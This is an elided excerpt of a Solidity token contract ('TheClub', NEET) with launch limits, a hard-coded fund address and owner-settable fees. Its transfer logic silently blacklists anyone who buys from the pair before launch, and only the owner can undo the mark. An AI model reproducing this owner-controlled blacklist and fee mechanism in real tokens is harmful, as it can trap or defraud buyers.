...
contract ethtest is Ownable, SecureLaunch {
    using SafeMath for uint256;

    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 _launchWalletMax = 10_000_000 * (10 ** _decimals);
    uint256 _launchmaxTxAmount = 5_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _launchmaxTxAmount;
    uint256 public _walletMax = _launchWalletMax;
    ...
    string constant _name = "TheClub";
    string constant _symbol = "NEET";
    ...
    constructor() {
        ...
        autoLiquidityReceiver = 0xc85408c0865E14A0825a6c19211e15D89eD12E31;
        TheFund = 0xc85408c0865E14A0825a6c19211e15D89eD12E31;

        totalFee = liquidityFee.add(FundFee);
    ...
    function getOwner() external view override returns (address) {return isOwner();} 

    function isBAD(address add) public view  returns (bool) {return isBadActor(add);}
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!goodToGo() && sender == pair && recipient != _owner) { 
			mark(recipient, true);
		}
    ...
    function marketingAndLiquidity() internal lockTheSwap {
        ...
        uint256 amountBNBMarketing = amountBNB.mul(FundFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(TheFund).call{value : amountBNBMarketing, gas : 30000}("");
        tmpSuccess = false;
    ...
    function setFees(uint256 newLiqFee, uint256 newFundFee) external onlyOwner {
    ...
    function guessIwasWrong(address add) public onlyOwner {
		mark(add, false);
	}
